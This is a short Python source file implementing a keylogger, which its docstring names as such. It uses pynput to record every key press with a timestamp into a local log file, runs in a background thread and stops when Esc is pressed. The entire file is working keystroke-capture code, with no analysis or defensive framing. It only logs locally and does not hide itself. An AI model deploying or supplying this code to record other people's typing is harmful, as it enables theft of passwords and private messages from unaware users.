from pynput.keyboard import Key, Listener
from threading import Timer, Thread
import time
import os

class Monitor:
	def _build_logs(self):
		if not os.path.exists('./logs'):
			os.mkdir('./logs')

	def _on_press(self, key):
		with open('./logs/log.txt', 'a') as f:
			timestamp = time.asctime(time.localtime(time.time()))
			f.write('{}\t\t{}\n'.format(timestamp, key))
	
	def _on_release(self, key):
		if key == Key.esc:
			return False

	def _keylogging(self):
		with Listener(on_press = self._on_press, on_release = self._on_release) as listener:
			listener.join()
	
	def run(self, interval = 1):
		"""
		Launch the keylogger with a threads.
		"""
		self._build_logs()
		Thread(target = self._keylogging).start()

if __name__ == '__main__':
	mon = Monitor()
	mon.run()
